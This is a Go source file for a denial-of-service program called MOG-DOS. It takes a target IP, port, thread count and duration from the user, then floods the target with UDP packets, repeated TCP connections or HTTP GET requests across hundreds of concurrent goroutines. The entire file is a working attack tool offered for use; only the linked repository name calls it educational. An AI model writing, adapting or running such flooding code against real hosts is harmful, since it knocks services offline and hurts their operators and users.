package main

import (
	"crypto/rand"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"sync"
	"time"
)

const (
	DARK_PURPLE = "\033[35m"
	DARK_BLUE   = "\033[34m"
	RED         = "\033[31m"
	GREEN       = "\033[32m"
	YELLOW      = "\033[33m"
	RESET       = "\033[0m"
)

var asciiArt = fmt.Sprintf(`%s╔──────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
│███╗   ███╗ ██████╗  ██████╗       ██████╗  ██████╗ ███████╗       ██╗   ██╗ ██╗   ██╗       ██████╗  ██████╗ │
│████╗ ████║██╔═══██╗██╔════╝       ██╔══██╗██╔═══██╗██╔════╝       ██║   ██║███║  ███║      ██╔════╝ ██╔═══██╗│
│██╔████╔██║██║   ██║██║  ███╗█████╗██║  ██║██║   ██║███████╗       ██║   ██║╚██║  ╚██║█████╗██║  ███╗██║   ██║│
│██║╚██╔╝██║██║   ██║██║   ██║╚════╝██║  ██║██║   ██║╚════██║       ╚██╗ ██╔╝ ██║   ██║╚════╝██║   ██║██║   ██║│
│██║ ╚═╝ ██║╚██████╔╝╚██████╔╝      ██████╔╝╚██████╔╝███████║███████╗╚████╔╝  ██║██╗██║      ╚██████╔╝╚██████╔╝│
│╚═╝     ╚═╝ ╚═════╝  ╚═════╝       ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ ╚═══╝   ╚═╝╚═╝╚═╝       ╚═════╝  ╚═════╝ │
╚──────────────────────────────────────────────────────────────────────────────────────────────────────────────╝%s`, RED, RESET)

func udpFlood(target string, duration int, wg *sync.WaitGroup) {
	defer wg.Done()
	end := time.Now().Add(time.Duration(duration) * time.Second)
	buf := make([]byte, 6096)
	rand.Read(buf)

	for time.Now().Before(end) {
		conn, err := net.Dial("udp", target)
		if err != nil {
			log.Printf("%sUDP Error: %v%s\n", RED, err, RESET)
			continue
		}
		conn.Write(buf)
		conn.Close()
		fmt.Printf("%sUDP: Sent packet to %s%s\n", GREEN, target, RESET)
		time.Sleep(1 * time.Millisecond)
	}
}

func tcpSynFlood(target string, duration int, wg *sync.WaitGroup) {
	defer wg.Done()
	end := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(end) {
		conn, err := net.Dial("tcp", target)
		if err != nil {
			log.Printf("%sTCP Error: %v%s\n", RED, err, RESET)
			continue
		}
		conn.Close()
		fmt.Printf("%sTCP SYN: Attempted connection to %s%s\n", GREEN, target, RESET)
		time.Sleep(1 * time.Millisecond)
	}
}

func httpGetFlood(target string, duration int, wg *sync.WaitGroup) {
	defer wg.Done()
	end := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(end) {
		conn, err := net.Dial("tcp", target)
		if err != nil {
			log.Printf("%sHTTP Error: %v%s\n", RED, err, RESET)
			continue
		}
		fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target)
		conn.Close()
		fmt.Printf("%sHTTP GET: Sent request to %s%s\n", GREEN, target, RESET)
		time.Sleep(5 * time.Millisecond)
	}
}

func main() {
	fmt.Println(asciiArt)
	fmt.Printf("%sMade by @misterofgames_yt || MOG-Developing (MOG-DOS_V1.1-GOLANG)%s\n", DARK_BLUE, RESET)
	fmt.Printf("%sMOG-DOS Project: https://github.com/MOG-Developing/DOS-ATTACK-educational%s\n", YELLOW, RESET)

	var targetIP, attackType string
	var targetPort, numThreads, duration int

	fmt.Printf("%sEnter target IP: %s", GREEN, RESET)
	fmt.Scanln(&targetIP)
	fmt.Printf("%sEnter target port: %s", GREEN, RESET)
	fmt.Scanln(&targetPort)
	fmt.Printf("%sEnter threads (0 for max): %s", GREEN, RESET)
	fmt.Scanln(&numThreads)
	fmt.Printf("%sAttack type (udp/tcp/http): %s", GREEN, RESET)
	fmt.Scanln(&attackType)
	fmt.Printf("%sDuration (seconds): %s", GREEN, RESET)
	fmt.Scanln(&duration)

	target := fmt.Sprintf("%s:%d", targetIP, targetPort)

	if numThreads <= 0 {
		numThreads = runtime.NumCPU() * 100
	}

	var attackFunc func(string, int, *sync.WaitGroup)
	switch attackType {
	case "udp":
		attackFunc = udpFlood
	case "tcp":
		attackFunc = tcpSynFlood
	case "http":
		attackFunc = httpGetFlood
	default:
		fmt.Printf("%sInvalid attack type%s\n", RED, RESET)
		os.Exit(1)
	}

	var wg sync.WaitGroup
	fmt.Printf("%sStarting %d threads...%s\n", YELLOW, numThreads, RESET)

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go attackFunc(target, duration, &wg)
	}
	wg.Wait()
	fmt.Printf("%sAttack completed%s\n", DARK_BLUE, RESET)
}
